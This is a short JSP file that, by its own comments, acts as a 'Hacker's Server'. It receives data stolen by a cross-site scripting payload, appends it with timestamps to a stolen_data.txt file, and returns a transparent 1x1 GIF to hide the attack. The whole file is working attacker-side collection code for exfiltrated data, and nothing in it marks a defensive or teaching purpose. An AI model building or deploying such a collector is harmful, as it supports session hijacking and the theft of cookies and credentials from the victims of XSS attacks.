<%@ page import="java.io.*, java.util.Date" %>
<%
    // This file acts as the "Hacker's Server"
    // It receives stolen data from the XSS payload and saves it to a text file.
    
    String data = request.getParameter("data");
    if (data != null && !data.trim().isEmpty()) {
        try {
            // Write stolen data to a file on the server
            String fileName = application.getRealPath("/") + "stolen_data.txt";
            FileWriter fw = new FileWriter(fileName, true); // append mode
            PrintWriter pw = new PrintWriter(fw);
            
            pw.println("[" + new Date().toString() + "] STOLEN DATA: " + data);
            pw.close();
            
            // Output a transparent 1x1 pixel image to keep the attack completely invisible
            response.setContentType("image/gif");
            byte[] transparentGif = {
                71, 73, 70, 56, 57, 97, 1, 0, 1, 0, -128, 0, 0, 0, 0, 0, 
                -1, -1, -1, 33, -7, 4, 1, 0, 0, 0, 0, 44, 0, 0, 0, 0, 
                1, 0, 1, 0, 0, 2, 2, 68, 1, 0, 59
            };
            response.getOutputStream().write(transparentGif);
            
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
%>
